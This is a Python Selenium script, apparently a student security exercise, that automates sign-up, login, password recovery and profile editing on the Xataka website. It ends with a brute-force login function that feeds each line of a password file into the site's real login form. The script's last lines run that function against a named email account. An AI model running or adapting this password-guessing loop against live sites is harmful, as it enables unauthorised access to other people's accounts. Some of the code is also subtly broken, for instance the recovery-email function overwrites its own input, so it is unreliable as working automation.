import selenium
import time
# import pyautogui
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select

# Abre el navegador


def spawn_browser():
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("-auto-open-devtools-for-tabs")
    chrome_options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://www.xataka.com/")
    driver.set_window_position(1, 1)
    driver.set_window_size(2000, 800)
    return driver


# Redirije a la página para registrarse


def navigate_to_signup():
    driver.find_element_by_css_selector(
        "a[href='#sections']").click()
    driver.implicitly_wait(10)
    driver.find_element_by_css_selector(
        "a[href='#nav-register']").click()

# Redirije a la página para iniciar sesión


def navigate_to_login():
    driver.find_element_by_css_selector(
        "a[href='#sections']").click()
    driver.implicitly_wait(10)
    driver.find_element_by_css_selector(
        "a[href='#nav-login']").click()

# Redirije a la página para recuperar contraseña


def navigate_to_recover():
    navigate_to_login()
    driver.implicitly_wait(10)
    driver.find_element_by_css_selector(
        "a[href='#nav-recover']").click()

# Abre el formulario de mofificación de usuario


def enter_update_profile():
    time.sleep(5)
    driver.find_element_by_css_selector(
        "a[href='#sections']").click()
    driver.find_element_by_id('js-open-edit-profile').click()

# Rellena el formulario de registro de usuario


def fill_form(user):
    email = driver.find_element_by_name('fos_user_registration_form[email]')
    password = driver.find_element_by_name(
        'fos_user_registration_form[plainPassword][first]')
    confirmation_password = driver.find_element_by_name(
        'fos_user_registration_form[plainPassword][second]')
    username = driver.find_element_by_name('user_name')
    email.send_keys(user['email'], Keys.ARROW_DOWN)
    driver.implicitly_wait(10)
    password.send_keys(user['password'], Keys.ARROW_DOWN)
    driver.implicitly_wait(10)
    confirmation_password.send_keys(
        user['confirmation_password'], Keys.ARROW_DOWN)
    driver.implicitly_wait(10)
    username.send_keys(user['username'], Keys.ARROW_DOWN)
    driver.implicitly_wait(10)
    policy = driver.find_element_by_name('condition_agree')
    driver.execute_script("arguments[0].checked=true", policy)
    driver.implicitly_wait(10)

# Rellena el formulario de email para recuperar contraseña


def fill_recover_password_email(email):
    email = driver.find_element_by_name('ud_username')
    email = driver.find_element_by_css_selector(
        "input[type='email'][id='recover-email'][name='ud_username']")
    email.send_keys(email, Keys.ARROW_DOWN)

# Rellena el formulario de inicio de sesión


def fill_login_form(login_data):
    email = driver.find_element_by_name('ud_username')
    password = driver.find_element_by_name('ud_pass')
    time.sleep(1)
    email.clear()
    password.clear()
    time.sleep(2)
    email.send_keys(login_data['email'], Keys.ARROW_DOWN)
    password.send_keys(login_data['password'], Keys.ARROW_DOWN)


# Envía los datos para registrar


def submit_form():
    driver.find_element_by_id('wsl_register_button').click()
    driver.find_element_by_css_selector(
        "button[type='submit']").click()


# Registra el usuario


def register_user(user):
    navigate_to_signup()
    fill_form(user)
    submit_form()

# Permite iniciar sesión


def login(login_data):
    navigate_to_login()
    fill_login_form(login_data)
    driver.find_element_by_id('wsl_login_button').click()

# Recupera contraseña


def recover_password(recovery_data):
    navigate_to_recover()
    fill_recover_password_email(recovery_data['email'])
    driver.find_element_by_id('request_password_button').click()

# Reinicia la contraseña para un usuario autenticado


def reset_password(login_data, reset_data):
    login(login_data)
    driver.implicitly_wait(20)
    enter_update_profile()
    driver.find_element_by_id('js-change-password').click()


# Login por fuerza bruta

def login_by_brute_force(mail):
    passwords = open('passwords.txt', 'r')
    tries = 0
    for password in passwords:
        tries += 1
        print('Intento', tries)
        print(password)
        login_data = {'email': mail, 'password': password}
        login(login_data)
        time.sleep(2)
        if driver.find_element_by_id('wsl_invalid_login'):
            driver.find_element_by_class_name('js-close-login').click()
            time.sleep(2)
        else:
            break
    return


driver = spawn_browser()

user = {'email': 'john.bidwell@mail.udp.cl', 'password': '123456',
        'confirmation_password': '123456', 'name': 'John Bidwell', 'username': 'johnbidwellbb'}
register_user(user)

login_data = {'email': 'john.bidwell@mail.udp.cl', 'password': '123456'}
login(login_data)

recovery_data = {'email': 'john.bidwell@mail.udp.cl'}
recover_password(recovery_data)

reset_data = {'password': '123456', 'confirmPassword': '123456'}
reset_password(login_data, reset_data)

brute_force_mail = 'john.bidwell@mail.udp.cl'
login_by_brute_force(brute_force_mail)
